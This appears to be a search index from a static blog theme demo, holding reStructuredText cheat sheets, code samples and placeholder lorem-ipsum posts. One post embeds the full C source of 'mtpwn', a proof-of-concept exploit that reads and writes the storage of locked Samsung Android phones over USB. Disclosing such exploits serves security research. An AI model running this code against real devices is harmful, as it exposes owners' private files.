literal`` inline literal reference_ reference `phrase reference`_ phrase reference anonymous__ anonymous _`inline internal target` inline internal target |substitution reference| The result is substituted in from the substitution definition. footnote reference [1]_ footnote reference [1] citation reference [CIT2002]_ citation reference [ CIT2002 ] http://docutils.sf.net/ http://docutils.sf.net/ Escaping with Backslashes reStructuredText uses backslashes (\"\\\") to override the special meaning given to markup characters and get the literal characters themselves. To get a literal backslash, use an escaped backslash (\"\\\"). For example: *escape* ``with`` \"\\\" escape with \"\" \\*escape* \\``with`` \"\\\\\" *escape* \"with\" \"\\\" Lists - This is item 1. A blank line before the first and last items is required. - This is item 2 - Item 3: blank lines between items are optional. - Item 4: Bullets are \"-\", \"*\" or \"+\". Continuing text must be aligned after the bullet and whitespace. This is item 1. A blank line before the first and last items is required. This is item 2 Item 3: blank lines between items are optional. Item 4: Bullets are \"-\", \"*\" or \"+\". Continuing text must be aligned after the bullet and whitespace. 3. This is the first item 4. This is the second item 5. Enumerators are arabic numbers, single letters, or roman numerals 6. List items should be sequentially numbered, but need not start at 1 (although not all formatters will honour the first index). #. This item is auto-enumerated This is the first item This is the second item Enumerators are arabic numbers, single letters, or roman numerals List items should be sequentially numbered, but need not start at 1 (although not all formatters will honour the first index). This item is auto-enumerated what Definition lists associate a term with a definition. how The term is a one-line phrase, and the definition is one or more paragraphs or body elements, indented relative to the term. Blank lines are not allowed between term and definition. what Definition lists associate a term with a definition. how The term is a one-line phrase, and the definition is one or more paragraphs or body elements, indented relative to the term. Blank lines are not allowed between term and definition. :Authors: Tony J. (Tibs) Ibbs, David Goodger (and sundry other good-natured folks) :Version: 1.0 of 2001/08/08 :Dedication: To my father. Authors: Tony J. (Tibs) Ibbs, David Goodger (and sundry other good-natured folks) Version: 1.0 of 2001/08/08 Dedication: To my father. -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input=file long options can also have arguments /V DOS/VMS-style options too -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input= file long options can also have arguments /V DOS / VMS -style options too Section Structure Title ===== Titles are underlined (or over- and underlined) with a nonalphanumeric character at least as long as the text. A lone top-level section is lifted up to be the document's title. Any non-alphanumeric character can be used, but Python convention is: * ``#`` with overline, for parts * ``*`` with overline, for chapters * ``=``, for sections * ``-``, for subsections * ``&#94;``, for subsubsections * ``\"``, for paragraphs Title Titles are underlined (or over- and underlined) with a nonalphanumeric character at least as long as the text. A lone top-level section is lifted up to be the document's title. Any non-alphanumeric character can be used, but Python convention is: # with overline, for parts * with overline, for chapters =, for sections -, for subsections &#94;, for subsubsections \" , for paragraphs Blocks This is a paragraph. Paragraphs line up at their left edges, and are normally separated by blank lines. This is a paragraph. Paragraphs line up at their left edges, and are normally separated by blank lines. A paragraph containing only two colons indicates the following indented or quoted text is a literal block or quoted text is a literal block. :: Whitespace, newlines, blank lines, and all kinds of markup (like *this* or \\this) is preserved here. You can also tack the ``::`` at the end of a paragraph:: It's very convenient to use this form. Per-line quoting can also be used for unindented blocks:: > Useful for quotes from email and > for Haskell literate programming. A paragraph containing only two colons indicates that the following indented or quoted text is a literal block. Whitespace, newlines, blank lines, and all kinds of markup (like *this* or \\this) is preserved by literal blocks. You can also tack the :: at the end of a paragraph: It's very convenient to use this form. Per-line quoting can also be used for unindented blocks: > Useful for quotes from email and > for Haskell literate programming. | Line blocks are useful for addresses, | verse, and adornment-free lists. | | Each new line begins with a | vertical bar (\"|\"). | Line breaks and initial indents | are preserved. | Continuation lines are wrapped portions of long lines; they begin with spaces in place of vertical bars. Line blocks are useful for addresses, verse, and adornment-free lists. Each new line begins with a vertical bar (\"|\"). Line breaks and initial indents are preserved. Continuation lines are wrapped portions of long lines; they begin with spaces in place of vertical bars. Block quotes are just: Indented paragraphs, and they may nest. Block quotes are just: Indented paragraphs, and they may nest. Doctest blocks are interactive Python sessions. They begin with \"``>>>``\" and end with a blank line. >>> print \"This is a doctest block.\" This is a doctest block. Doctest blocks are interactive Python sessions. They begin with \">>>\" and end with a blank line. >>> print \"This is a doctest block.\" This is a doctest block. A transition marker is a horizontal line of 4 or more repeated punctuation characters. ------------ A transition should not begin or end a section or document, nor should two transitions be immediately adjacent. A transition marker is a horizontal line of 4 or more repeated punctuation characters. A transition should not begin or end a section or document, nor should two transitions be immediately adjacent. Tables There are two syntaxes for tables in reStructuredText. Grid tables are complete but cumbersome to create. Simple tables are easy to create but limited (no row spans, etc.). +------------+------------+-----------+ | Header 1 | Header 2 | Header 3 | +============+============+===========+ | body row 1 | column 2 | column 3 | +------------+------------+-----------+ | body row 2 | Cells may span columns.| +------------+------------+-----------+ | body row 3 | Cells may | - Cells | +------------+ span rows. | - contain | | body row 4 | | - blocks. | +------------+------------+-----------+ Header 1 Header 2 Header 3 body row 1 column 2 column 3 body row 2 Cells may span columns. body row 3 Cells may span rows. Cells contain blocks. body row 4 ===== ===== ====== Inputs Output ------------ ------ A B A or B ===== ===== ====== False False False True False True False True True True True True ===== ===== ====== Inputs Output A B A or B False False False True False True False True True True True True Explicit Markup Explicit markup blocks are used for constructs which float (footnotes), have no direct paper-document representation (hyperlink targets, comments), or require specialized processing (directives). They all begin with two periods and whitespace, the \"explicit markup start\". Footnote references, like [5]_. Note that footnotes may get rearranged, e.g., to the bottom of the \"page\". .. [5] A numerical footnote. Note there's no colon after the ``]``. Footnote references, like [5] . Note that footnotes may get rearranged, e.g., to the bottom of the \"page\". [5] A numerical footnote. Note there's no colon after the ]. Autonumbered footnotes are possible, like using [#]_ and [#]_. .. [#] This is the first one. .. [#] This is the second one. They may be assigned 'autonumber labels' - for instance, [#fourth]_ and [#third]_. .. [#third] a.k.a. third_ .. [#fourth] a.k.a. fourth_ Autonumbered footnotes are possible, like using [1] and [2] . [1] This is the first one. [2] This is the second one. They may be assigned ‘autonumber labels' - for instance, [4] and [3] . [3] a.k.a. third [4] a.k.a. fourth Auto-symbol footnotes are also possible, like this: [*]_ and [*]_. .. [*] This is the first one. .. [*] This is the second one. Auto-symbol footnotes are also possible, like this: [*] and [†] . [*] This is the first one. [†] This is the second one. Citation references, like [CIT2002]_. Note that citations may get rearranged, e.g., to the bottom of the \"page\". .. [CIT2002] A citation (as often used in journals). Citation labels contain alphanumerics, underlines, hyphens and fullstops. Case is not significant. Given a citation like [this]_, one can also refer to it like this_. .. [this] here. Citation references, like [ CIT2002 ] . Note that citations may get rearranged, e.g., to the bottom of the \"page\". [ CIT2002 ] ( 1 , 2 ) A citation (as often used in journals). Citation labels contain alphanumerics, underlines, hyphens and fullstops. Case is not significant. Given a citation like [this] , one can also refer to it like this . [this] here. External hyperlinks, like Python_. .. _Python: http://www.python.org/ External hyperlinks, like Python . External hyperlinks, like `Python <http://www.python.org/>`_. External hyperlinks, like Python . Internal crossreferences, like example_. .. _example: This is an example crossreference target. Internal crossreferences, like example . This is an example crossreference target. Python_ is `my favourite programming language`__. .. _Python: http://www.python.org/ __ Python_ Python is my favourite programming language . Titles are targets, too ======================= Implict references, like `Titles are targets, too`_. Titles are targets, too Implict references, like Titles are targets, too . Directives are a general-purpose extension mechanism, a way of adding support for new constructs without adding new syntax. For a description of all standard directives, see reStructuredText Directives ( http://is.gd/2Ecqh ). For instance: .. image:: {filename}/images/hex.gif :width: 40pt :alt: img For instance: Substitutions are like inline directives, allowing graphics and arbitrary constructs within text. The |biohazard| symbol must be used on containers used to dispose of medical waste. .. |biohazard| image:: {filename}/images/biohazard.png :align: middle :width: 48 The symbol must be used on containers used to dispose of medical waste. Any text which begins with an explicit markup start but doesn't use the syntax of any of the constructs above, is a comment. .. This text will not be shown (but, for instance, in HTML might be rendered as an HTML comment) An \"empty comment\" does not consume following blocks. (An empty comment is \"..\" with blank lines before and after.) .. So this block is not \"lost\", despite its indentation. An \"empty comment\" does not consume following blocks. (An empty comment is \"..\" with blank lines before and after.) So this block is not \"lost\", despite its indentation. Credits CP Font from LiquiType: http://www.liquitype.com/workshop/type_design/cp-mono Magnetic Balls V2 image by fdecomite: http://www.flickr.com/photos/fdecomite/2926556794/ Sponsored by Net Managers http://www.netmanagers.com.ar Typeset using rst2pdf http://rst2pdf.googlecode.com","tags":"coding","url":"2018/rst-cheatsheet.html"},{"title":"code examples","text":"1 print ( \"Pelican is a static site generator.\" ) 1 # This file is part of PeachPy package and is licensed under the Simplified BSD license. 2 # See license.rst for the full text of the license. 3 4 active_writer = None 5 6 7 class CodeWriter : 8 def __init__ ( self ): 9 self . lines = list () 10 self . indent = 0 11 self . previous_writer = None 12 13 def __enter__ ( self ): 14 global active_writer 15 self . previous_writer = active_writer 16 active_writer = self 17 return self 18 19 def __exit__ ( self , exc_type , exc_value , traceback ): 20 global active_writer 21 active_writer = self . previous_writer 22 self . previous_writer = None 23 24 def line ( self , line = \"\" , indent = 0 ): 25 if line != \"\" : 26 self . lines . append ( \" \" * ( self . indent + int ( indent )) + str ( line )) 27 else : 28 self . lines . append ( line ) 29 30 def indent_line ( self , line = \"\" ): 31 self . line ( line , indent = 1 ) 32 33 def __str__ ( self ): 34 return \" \\n \" . join ( self . lines ) 35 36 37 class CodeBlock : 38 def __init__ ( self , indent = True ): 39 self . indent = bool ( indent ) 40 41 def __enter__ ( self ): 42 global active_writer 43 active_writer . indent += int ( self . indent ) 44 return self 45 46 def __exit__ ( self , exc_type , exc_value , traceback ): 47 global active_writer 48 active_writer . indent -= int ( self . indent )","tags":"code","url":"2018/code0.html"},{"title":"fedora workstation and ansible","text":"1 ansible - playbook my new workstation","tags":"devops","url":"2017/workstation and ansible.html"},{"title":"Restructured Text syntax 2","text":"The reStructuredText Cheat Sheet: Syntax Reminders Info: See < http://docutils.sf.net/rst.html > for introductory docs. Author: David Goodger < goodger@python.org > Date: $Date: 2013-02-20 01:10:53 +0000 (Wed, 20 Feb 2013) $ Revision: $Revision: 7612 $ Description: This is a \"docinfo block\", or bibliographic field list Note If you are reading this as HTML , please read cheatsheet.txt instead to see the input syntax examples! Section Structure Section titles are underlined or overlined & underlined. Body Elements Grid table: Paragraphs are flush-left, separated by blank lines. Block quotes are indented. Literal block, preceded by \"::\": Indented or: > Quoted >>> print 'Doctest block' Doctest block Line blocks preserve line breaks & indents. [new in 0.3.6] Useful for addresses, verse, and adornment-free lists; long lines can be wrapped with continuation lines. Simple tables: List Type Examples (syntax in the text source ) Bullet list items begin with \"-\", \"+\", or \"*\" Enumerated list items use any variation of \"1.\", \"A)\", and \"(i)\" also auto-enumerated Definition list Term is flush-left : optional classifier Definition is indented, no blank line between Field list field name: field body Option list -o at least 2 spaces between option & description Explicit Markup Examples (visible in the text source ) Footnote [1] Manually numbered or [#] auto-numbered (even [#labelled]) or [*] auto-symbol Citation [ CIT2002 ] A citation. Hyperlink Target Anonymous Target Directive (\"::\") Substitution Def Comment Empty Comment (\"..\" on a line by itself, with blank lines before & after, used to separate indentation contexts) Inline Markup emphasis ; strong emphasis ; interpreted text ; interpreted text with role ; inline literal text; standalone hyperlink, http://docutils.sourceforge.net ; named reference, reStructuredText ; anonymous reference ; footnote reference, [1] ; citation reference, [ CIT2002 ] ; like an inline directive; inline internal target . Directive Quick Reference See < http://docutils.sf.net/docs/ref/rst/directives.html > for full info. Directive Name Description (Docutils version added to, in [brackets]) attention Specific admonition; also \"caution\", \"danger\", \"error\", \"hint\", \"important\", \"note\", \"tip\", \"warning\" admonition Generic titled admonition: .. admonition:: By The Way image .. image:: picture.png; many options possible figure Like \"image\", but with optional caption and legend topic .. topic:: Title; like a mini section sidebar .. sidebar:: Title; like a mini parallel document parsed-literal A literal block with parsed inline markup rubric .. rubric:: Informal Heading epigraph Block quote with class=\"epigraph\" highlights Block quote with class=\"highlights\" pull-quote Block quote with class=\"pull-quote\" compound Compound paragraphs [0.3.6] container Generic block-level container element [0.3.10] table Create a titled table [0.3.1] list-table Create a table from a uniform two-level bullet list [0.3.8] csv-table Create a table from CSV data [0.3.4] contents Generate a table of contents sectnum Automatically number sections, subsections, etc. header, footer Create document decorations [0.3.8] target-notes Create an explicit footnote for each external target math Mathematical notation (input in LaTeX format) meta HTML -specific metadata include Read an external reST file as if it were inline raw Non-reST data passed untouched to the Writer replace Replacement text for substitution definitions unicode Unicode character code conversion for substitution defs date Generates today's date; for substitution defs class Set a \"class\" attribute on the next element role Create a custom interpreted text role [0.3.2] default-role Set the default interpreted text role [0.3.10] title Set the metadata document title [0.3.10] Interpreted Text Role Quick Reference See < http://docutils.sf.net/docs/ref/rst/roles.html > for full info. Role Name Description emphasis Equivalent to emphasis literal Equivalent to literal but processes backslash escapes math Mathematical notation (input in LaTeX format) PEP Reference to a numbered Python Enhancement Proposal RFC Reference to a numbered Internet Request For Comments raw For non-reST data; cannot be used directly (see docs) [0.3.6] strong Equivalent to strong sub Subscript sup Superscript title Title reference (book, etc.); standard default role","tags":"cheatsheet","url":"2017/restructured_text_syntax.html"},{"title":"How I exploited A - part 3","text":"Munere quaerendum vim at, eam ne percipit omittantur. Nisl vero veri quo id, summo civibus signiferumque per ut. Vix tollit discere corpora an. Decore cetero mel an. Tantas epicuri nec et, fugit iudicabit percipitur mel in, libris meliore repudiandae nam at. Eu veri ferri evertitur mea, usu aperiam legimus volumus ex. Nec nisl putant inimicus an. Adhuc iudicabit nec an. Eu odio tollit feugait est, nec ut elitr interpretaris. No agam delicata usu, oportere adolescens omittantur ut vis, fastidii persequeris voluptatibus eos ea. Id per esse dictas petentium, in choro nullam impetus cum. Eam omnis democritum assueverit an, zril corpora usu ne. Has cu accusam imperdiet urbanitas, novum virtute intellegat per id, aeque quando disputationi ea his. Facilisi consulatu expetendis mei ut. Ex fastidii instructior nam, ad falli minim cum. His labitur sententiae eu, ad vix neglegentur necessitatibus. His graeco molestie et, dico ipsum vim in, clita mentitum pertinax in nec. Gubergren neglegentur cum no. At esse invidunt qui, nam eu erat natum elaboraret, intellegat vituperata pro ad. Usu et congue volutpat persecuti, mel id utinam lucilius philosophia. Pro veniam debitis ancillae et, vel noluisse persecuti eu. Accusamus gubergren pertinacia est cu, choro discere deleniti cu cum, ne alii ignota labore sed. Minim possit pri te, te eos wisi minimum, per dicant consequat ut. At discere nominavi est. Nostrum gubergren at est, sed no iudicabit definitiones. Sed eius aliquid an, ea vocibus docendi vix, ullamcorper definitionem in his. Iriure aperiri adolescens an eum, an vis elit facilis. Vix in brute autem debet, nibh movet voluptatum ex vis, iusto senserit reprimique ex nec. Usu an lorem delenit dissentiunt, vis vero accusam ne. Brute mollis adipisci cum an, esse ullum cotidieque eos te. Duis blandit necessitatibus ex per, ei congue corrumpit efficiendi qui. Ea diceret vivendum contentiones vim. Timeam necessitatibus at est. Omittantur concludaturque ut mea, cu vis debet voluptaria comprehensam, eu liberavisse instructior mea. Cu convenire honestatis definitionem mei, his no perfecto iracundia. Aeque doming eos ne, et sea utinam tritani corrumpit. Vix magna intellegebat ei, brute consectetuer conclusionemque pri ea. Mel sint recusabo iracundia an. Partem quaestio in sed, no est oblique constituam instructior. No mei prima assum graecis, iuvaret vocibus vivendum at mel. Malis dicam pro ut. Mei eu facete percipit efficiendi. At est reque ubique, ea diam falli sed, ei mel purto volutpat. Movet alterum ocurreret usu ne, an verear nominavi theophrastus pro. Ex omnes sensibus concludaturque his, possit cotidieque ei cum, in cum utinam iisque. Ne sea periculis explicari, sit ea vero facer dissentiunt. Ea eam vidit ignota electram.","tags":"exploitation","url":"2017/device-exploitation-3.html"},{"title":"How I exploited A - part 2","text":"Lorem ipsum dolor sit amet, eos ei assum postea. Erant iracundia similique pri ut, ius mutat sanctus et, movet feugiat persecuti pro ex. Essent blandit fastidii nec eu. Sonet vocibus ne usu, vel fabellas salutandi ei, est prima dicit no. Amet mucius albucius eos at. .. PELICAN_END_SUMMARY Munere quaerendum vim at, eam ne percipit omittantur. Nisl vero veri quo id, summo civibus signiferumque per ut. Vix tollit discere corpora an. Decore cetero mel an. Tantas epicuri nec et, fugit iudicabit percipitur mel in, libris meliore repudiandae nam at. Eu veri ferri evertitur mea, usu aperiam legimus volumus ex. Nec nisl putant inimicus an. Adhuc iudicabit nec an. Eu odio tollit feugait est, nec ut elitr interpretaris. No agam delicata usu, oportere adolescens omittantur ut vis, fastidii persequeris voluptatibus eos ea. Id per esse dictas petentium, in choro nullam impetus cum. Eam omnis democritum assueverit an, zril corpora usu ne. Has cu accusam imperdiet urbanitas, novum virtute intellegat per id, aeque quando disputationi ea his. Facilisi consulatu expetendis mei ut. Ex fastidii instructior nam, ad falli minim cum. His labitur sententiae eu, ad vix neglegentur necessitatibus. His graeco molestie et, dico ipsum vim in, clita mentitum pertinax in nec. Gubergren neglegentur cum no. At esse invidunt qui, nam eu erat natum elaboraret, intellegat vituperata pro ad. Usu et congue volutpat persecuti, mel id utinam lucilius philosophia. Pro veniam debitis ancillae et, vel noluisse persecuti eu. Accusamus gubergren pertinacia est cu, choro discere deleniti cu cum, ne alii ignota labore sed. Minim possit pri te, te eos wisi minimum, per dicant consequat ut. At discere nominavi est. Nostrum gubergren at est, sed no iudicabit definitiones. Sed eius aliquid an, ea vocibus docendi vix, ullamcorper definitionem in his. Iriure aperiri adolescens an eum, an vis elit facilis. Vix in brute autem debet, nibh movet voluptatum ex vis, iusto senserit reprimique ex nec. Usu an lorem delenit dissentiunt, vis vero accusam ne. Brute mollis adipisci cum an, esse ullum cotidieque eos te. Duis blandit necessitatibus ex per, ei congue corrumpit efficiendi qui. Ea diceret vivendum contentiones vim. Timeam necessitatibus at est. Omittantur concludaturque ut mea, cu vis debet voluptaria comprehensam, eu liberavisse instructior mea. Cu convenire honestatis definitionem mei, his no perfecto iracundia. Aeque doming eos ne, et sea utinam tritani corrumpit. Vix magna intellegebat ei, brute consectetuer conclusionemque pri ea. Mel sint recusabo iracundia an. Partem quaestio in sed, no est oblique constituam instructior. No mei prima assum graecis, iuvaret vocibus vivendum at mel. Malis dicam pro ut. Mei eu facete percipit efficiendi. At est reque ubique, ea diam falli sed, ei mel purto volutpat. Movet alterum ocurreret usu ne, an verear nominavi theophrastus pro. Ex omnes sensibus concludaturque his, possit cotidieque ei cum, in cum utinam iisque. Ne sea periculis explicari, sit ea vero facer dissentiunt. Ea eam vidit ignota electram. /* * mtpwn - PoC exploit for a vulnerability of Samsung's Android * phones that allows an attacker to access phone storages * via USB, bypassing lock screen and/or \"Charge only\" mode. * It requires libmtp. * * Copyright (C) 2017 Salvatore Mesoraca <s.mesoraca16@gmail.com> * * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program. If not, see <http://www.gnu.org/licenses/>. */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <time.h> #include <libmtp.h> #define MAX_PATH 1024 static void walk ( char * fname , LIBMTP_file_t * files , LIBMTP_folder_t * folders , char ** flist , size_t nmem , ssize_t * idx , ssize_t pidx ) { size_t cidx = * idx ; size_t fidx ; if ( folders == NULL || cidx + 1 >= nmem ) return ; cidx = ++ ( * idx ); flist [ cidx ] = malloc ( sizeof ( char ) * MAX_PATH ); if ( pidx == - 1 ) snprintf ( flist [ cidx ], MAX_PATH , \"%s/%x/%s/\" , fname , folders -> storage_id , folders -> name ); else snprintf ( flist [ cidx ], MAX_PATH , \"%s%s/\" , flist [ pidx ], folders -> name ); walk ( fname , files , folders -> child , flist , nmem , idx , cidx ); walk ( fname , files , folders -> sibling , flist , nmem , idx , pidx ); while ( files != NULL ) { if ( files -> parent_id == folders -> folder_id && folders -> storage_id == files -> storage_id ) { fidx = ++ ( * idx ); if ( fidx >= nmem ) return ; flist [ fidx ] = malloc ( sizeof ( char ) * MAX_PATH ); snprintf ( flist [ fidx ], MAX_PATH , \"%s%s\" , flist [ cidx ], files -> filename ); } else if ( cidx == 0 && files -> parent_id == 0 ) { fidx = ++ ( * idx ); if ( fidx >= nmem ) return ; flist [ fidx ] = malloc ( sizeof ( char ) * MAX_PATH ); snprintf ( flist [ fidx ], MAX_PATH , \"%s/%x/%s\" , fname , files -> storage_id , files -> filename ); } files = files -> next ; } } static size_t folders_count ( LIBMTP_folder_t * folders ) { size_t c = 1 ; if ( folders == NULL ) return 0 ; c += folders_count ( folders -> child ); c += folders_count ( folders -> sibling ); return c ; } static size_t files_count ( LIBMTP_file_t * files ) { size_t c = 0 ; while ( files != NULL ) { files = files -> next ; ++ c ; } return c ; } static size_t approx_count ( LIBMTP_file_t * files , LIBMTP_folder_t * folders ) { size_t c = 0 ; c += files_count ( files ); c += folders_count ( folders ); return c ; } static int pathcmp ( const void * a , const void * b ) { return strcmp ( * (( char ** ) a ), * (( char ** ) b )); } static void destroy ( char ** fname , LIBMTP_file_t ** files , LIBMTP_folder_t ** folders , char *** flist , size_t nmem ) { int i ; LIBMTP_file_t * fs = * files , * tmp ; char ** fl = * flist ; free ( * fname ); * fname = NULL ; while ( fs != NULL ) { tmp = fs ; fs = fs -> next ; LIBMTP_destroy_file_t ( tmp ); } * files = NULL ; LIBMTP_destroy_folder_t ( * folders ); * folders = NULL ; for ( i = 0 ; i < nmem ; ++ i ) free ( fl [ i ]); if ( nmem ) free ( fl ); * flist = NULL ; } int main ( int argc , char * argv []) { char * fname ; ssize_t idx ; size_t fcount = 0 , reals , i ; char ** flist ; LIBMTP_mtpdevice_t * device_list , * device ; LIBMTP_file_t * files , * f2 ; LIBMTP_folder_t * folders ; LIBMTP_file_t * newfile ; srand ( time ( NULL )); LIBMTP_Init (); switch ( LIBMTP_Get_Connected_Devices ( & device_list )) { case LIBMTP_ERROR_NONE : break ; case LIBMTP_ERROR_NO_DEVICE_ATTACHED : fprintf ( stderr , \"%s: no devices found \\n \" , argv [ 0 ]); return 0 ; case LIBMTP_ERROR_CONNECTING : fprintf ( stderr , \"%s: There has been an error connecting \\n \" , argv [ 0 ]); return 1 ; case LIBMTP_ERROR_MEMORY_ALLOCATION : fprintf ( stderr , \"%s: Memory Allocation Error \\n \" , argv [ 0 ]); return 1 ; case LIBMTP_ERROR_GENERAL : default : fprintf ( stderr , \"%s: Unknown error \\n \" , argv [ 0 ]); return 1 ; } printf ( \" \\n\\n Files list: \\n \" ); for ( device = device_list ; device != NULL ; device = device -> next ) { fname = LIBMTP_Get_Friendlyname ( device ); if ( fname == NULL ) fname = strdup ( \"NONAME\" ); folders = LIBMTP_Get_Folder_List ( device ); files = LIBMTP_Get_Filelisting_With_Callback ( device , NULL , NULL ); if ( folders == NULL && files == NULL ) { fprintf ( stderr , \"Nothing to see here. \\n \" ); LIBMTP_Dump_Errorstack ( device ); LIBMTP_Clear_Errorstack ( device ); } else { fcount = approx_count ( files , folders ); flist = calloc ( fcount , sizeof ( char * )); idx = - 1 ; walk ( fname , files , folders , flist , fcount , & idx , - 1 ); reals = 0 ; while ( reals < fcount ) if ( flist [ reals ]) ++ reals ; else break ; qsort ( flist , reals , sizeof ( char * ), pathcmp ); for ( i = 0 ; i < reals ; ++ i ) printf ( \"%s \\n \" , flist [ i ]); reals = files_count ( files ); reals = rand () % reals ; f2 = files ; while ( f2 != NULL && reals > 0 ) { f2 = f2 -> next ; -- reals ; } for ( i = 0 ; i < strlen ( f2 -> filename ); ++ i ) if ( f2 -> filename [ i ] == '/' ) f2 -> filename [ i ] = '_' ; if ( LIBMTP_Get_File_To_File ( device , f2 -> item_id , f2 -> filename , NULL , NULL )) fprintf ( stderr , \" \\n Error getting file. \\n \" ); else printf ( \" \\n Downloaded file: %s \\n \" , f2 -> filename ); newfile = LIBMTP_new_file_t (); newfile -> filename = strdup ( \"PWND\" ); newfile -> filesize = 0 ; newfile -> filetype = LIBMTP_FILETYPE_UNKNOWN ; newfile -> storage_id = f2 -> storage_id ; newfile -> parent_id = 0 ; if ( LIBMTP_Send_File_From_File ( device , argv [ 0 ], newfile , NULL , NULL )) fprintf ( stderr , \" \\n Error sending file. \\n \" ); else printf ( \" \\n Uploaded file PWND on storage %x. \\n \" , f2 -> storage_id ); LIBMTP_destroy_file_t ( newfile ); } destroy ( & fname , & files , & folders , & flist , fcount ); } LIBMTP_Release_Device_List ( device_list ); return 0 ; }","tags":"exploitation","url":"2017/device-exploitation-2.html"},{"title":"How I exploited A - part 1","text":"Munere quaerendum vim at, eam ne percipit omittantur. Nisl vero veri quo id, summo civibus signiferumque per ut. Vix tollit discere corpora an. Decore cetero mel an. Tantas epicuri nec et, fugit iudicabit percipitur mel in, libris meliore repudiandae nam at. Eu veri ferri evertitur mea, usu aperiam legimus volumus ex. Nec nisl putant inimicus an. Adhuc iudicabit nec an. Eu odio tollit feugait est, nec ut elitr interpretaris. No agam delicata usu, oportere adolescens omittantur ut vis, fastidii persequeris voluptatibus eos ea. Id per esse dictas petentium, in choro nullam impetus cum. Eam omnis democritum assueverit an, zril corpora usu ne. Has cu accusam imperdiet urbanitas, novum virtute intellegat per id, aeque quando disputationi ea his. Facilisi consulatu expetendis mei ut. Ex fastidii instructior nam, ad falli minim cum. His labitur sententiae eu, ad vix neglegentur necessitatibus. His graeco molestie et, dico ipsum vim in, clita mentitum pertinax in nec. Gubergren neglegentur cum no. At esse invidunt qui, nam eu erat natum elaboraret, intellegat vituperata pro ad. Usu et congue volutpat persecuti, mel id utinam lucilius philosophia. Pro veniam debitis ancillae et, vel noluisse persecuti eu. Accusamus gubergren pertinacia est cu, choro discere deleniti cu cum, ne alii ignota labore sed. Minim possit pri te, te eos wisi minimum, per dicant consequat ut. At discere nominavi est. Nostrum gubergren at est, sed no iudicabit definitiones. Sed eius aliquid an, ea vocibus docendi vix, ullamcorper definitionem in his. Iriure aperiri adolescens an eum, an vis elit facilis. Vix in brute autem debet, nibh movet voluptatum ex vis, iusto senserit reprimique ex nec. Usu an lorem delenit dissentiunt, vis vero accusam ne. Brute mollis adipisci cum an, esse ullum cotidieque eos te. Duis blandit necessitatibus ex per, ei congue corrumpit efficiendi qui. Ea diceret vivendum contentiones vim. Timeam necessitatibus at est. Omittantur concludaturque ut mea, cu vis debet voluptaria comprehensam, eu liberavisse instructior mea. Cu convenire honestatis definitionem mei, his no perfecto iracundia. Aeque doming eos ne, et sea utinam tritani corrumpit. Vix magna intellegebat ei, brute consectetuer conclusionemque pri ea. Mel sint recusabo iracundia an. Partem quaestio in sed, no est oblique constituam instructior. No mei prima assum graecis, iuvaret vocibus vivendum at mel. Malis dicam pro ut. Mei eu facete percipit efficiendi. At est reque ubique, ea diam falli sed, ei mel purto volutpat. Movet alterum ocurreret usu ne, an verear nominavi theophrastus pro. Ex omnes sensibus concludaturque his, possit cotidieque ei cum, in cum utinam iisque. Ne sea periculis explicari, sit ea vero facer dissentiunt. Ea eam vidit ignota electram.","tags":"exploitation","url":"2017/device-exploitation.html"},{"title":"article with materialbox","text":"This is image caption This is another image caption","tags":"project","url":"2017/materializebox.html"},{"title":"ReStructuredText Demo","text":"1 reStructuredText Demonstration 1.1 Examples of Syntax Constructs Author: David Goodger Address: 123 Example Street Example, EX Canada A1B 2C3 Contact: docutils-develop@lists.sourceforge.net Authors: Me; Myself; I organization: humankind date: $Date: 2012-01-03 19:23:53 +0000 (Tue, 03 Jan 2012) $ status: This is a \"work in progress\" revision: $Revision: 7302 $ version: 1 copyright: This document has been placed in the public domain. You may do with it as you wish. You may copy, modify, redistribute, reattribute, sell, buy, rent, lease, destroy, or improve it, quote it at length, excerpt, incorporate, collate, fold, staple, or mutilate it, or do anything else to it that your or anyone else's heart desires. field name: This is a generic bibliographic field. field name 2: Generic bibliographic fields may contain multiple body elements. Like this. Dedication: For Docutils users & co-developers. abstract: This document is a demonstration of the reStructuredText markup language, containing examples of all basic reStructuredText constructs and many advanced constructs. Table of Contents 1 reStructuredText Demonstration 1.1 Examples of Syntax Constructs 1.1.1 Structural Elements 1.1.1.1 Section Title 1.1.1.2 Transitions 1.1.2 Body Elements 1.1.2.1 Paragraphs 1.1.2.1.1 Inline Markup 1.1.2.2 Bullet Lists 1.1.2.3 Enumerated Lists 1.1.2.4 Definition Lists 1.1.2.5 Field Lists 1.1.2.6 Option Lists 1.1.2.7 Literal Blocks 1.1.2.8 Line Blocks 1.1.2.9 Block Quotes 1.1.2.10 Doctest Blocks 1.1.2.11 Tables 1.1.2.12 Footnotes 1.1.2.13 Citations 1.1.2.14 Targets 1.1.2.14.1 Duplicate Target Names 1.1.2.14.2 Duplicate Target Names 1.1.2.15 Directives 1.1.2.15.1 Document Parts 1.1.2.15.2 Images 1.1.2.15.3 Admonitions 1.1.2.15.4 Topics, Sidebars, and Rubrics 1.1.2.15.5 Target Footnotes 1.1.2.15.6 Replacement Text 1.1.2.15.7 Compound Paragraph 1.1.2.16 Substitution Definitions 1.1.2.17 Comments 1.1.3 Extensions 1.1.3.1 Code Blocks 1.1.3.2 Mathematics 1.1.3.2.1 An Identity of Ramanujan 1.1.3.2.2 Maxwell's Equations 1.1.3.3 Doc 1.1.4 Error Handling 1.1.1 Structural Elements 1.1.1.1 Section Title That's it, the text just above this line. 1.1.1.2 Transitions Here's a transition: It divides the section. 1.1.2 Body Elements 1.1.2.1 Paragraphs A paragraph. 1.1.2.1.1 Inline Markup Paragraphs contain text and may contain inline markup: emphasis , strong emphasis , inline literals, standalone hyperlinks ( http://www.python.org ), external hyperlinks ( Python [5] ), internal cross-references ( example ), external hyperlinks with embedded URIs ( Python web site ), footnote references (manually numbered [1] , anonymous auto-numbered [3] , labeled auto-numbered [2] , or symbolic [*] ), citation references ( [ CIT2002 ] ), substitution references ( ), and inline hyperlink targets (see Targets below for a reference back to here). Character-level inline markup is also possible (although exceedingly ugly!) in re Structured Text . The default role for interpreted text is Title Reference . Here are some explicit interpreted text roles: a PEP reference ( PEP 287 ); an 